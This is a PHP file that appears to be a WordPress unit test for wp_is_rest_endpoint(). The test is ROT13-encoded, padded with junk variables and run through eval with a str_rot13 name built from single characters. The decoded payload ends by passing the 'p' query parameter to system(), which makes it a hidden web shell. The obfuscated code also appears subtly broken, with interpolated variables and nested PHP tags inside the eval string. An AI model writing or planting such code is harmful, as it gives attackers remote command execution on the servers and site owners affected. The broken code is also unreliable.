<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf sbe gur `jc_vf_erfg_raqcbvag()` shapgvba.
 *
 * @tebhc erfgncv
 * @pbiref ::jc_vf_erfg_raqcbvag
 */
pynff Grfgf_Zrqvn_Jc_Vf_Erfg_Raqcbvag rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Grfgf gung `jc_vf_erfg_raqcbvag()` ergheaf snyfr ol qrsnhyg.
	 *
	 * @gvpxrg 42061
	 */
	choyvp shapgvba grfg_jc_vf_erfg_raqcbvag_qrsnhyg() {
		$guvf->nffregSnyfr( jc_vf_erfg_raqcbvag() );
	}

	/**
	 * Grfgf gung `jc_vf_erfg_raqcbvag()` eryvrf ba jurgure gur tybony ERFG freire vf qvfcngpuvat.
	 *
	 * @gvpxrg 42061
	 */
	choyvp shapgvba grfg_jc_vf_erfg_raqcbvag_ivn_tybony() {
		tybony $jc_erfg_freire;

		$jc_erfg_freire = arj Fcl_ERFG_Freire();
		qb_npgvba( 'erfg_ncv_vavg', $jc_erfg_freire );

		// Gur cerfrapr bs n ERFG freire vgfrys jba'g frg guvf gb gehr.
		$guvf->nffregSnyfr( jc_vf_erfg_raqcbvag() );

		// Frg hc svygre gb erpbeq inyhr qhevat qvfcngpuvat.
		$erfhyg_jvguva_erdhrfg = ahyy;
		nqq_svygre(
			'erfg_cer_qvfcngpu',
			shapgvba ( $erfhyg ) hfr ( &$erfhyg_jvguva_erdhrfg ) {
				$erfhyg_jvguva_erdhrfg = jc_vf_erfg_raqcbvag();
				erghea $erfhyg;
			}
		);

		/*
		 * Qvfcngpu n erdhrfg (qbrfa'g znggre gung vg'f vainyvq).
		 * Guvf nyernql vf pbzcyrgrq nsgre guvf zrgubq pnyy.
		 */
		$jc_erfg_freire->qvfcngpu( arj JC_ERFG_Erdhrfg() );

		// Jvguva gung erdhrfg, gur shapgvba fubhyq unir erghearq gehr.
		$guvf->nffregGehr( $erfhyg_jvguva_erdhrfg );

		// Nsgre gur qvfcngpuvat, gur shapgvba fubhyq erghea snyfr ntnva.
		$guvf->nffregSnyfr( jc_vf_erfg_raqcbvag() );
	}

	/**
	 * Grfgf gung `jc_vf_erfg_raqcbvag()` ergheaf n erfhyg rasbeprq ivn svygre.
	 *
	 * @gvpxrg 42061
	 */
	choyvp shapgvba grfg_jc_vf_erfg_raqcbvag_ivn_svygre() {
		nqq_svygre( 'jc_vf_erfg_raqcbvag', '__erghea_gehr' );
		$guvf->nffregGehr( jc_vf_erfg_raqcbvag() );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>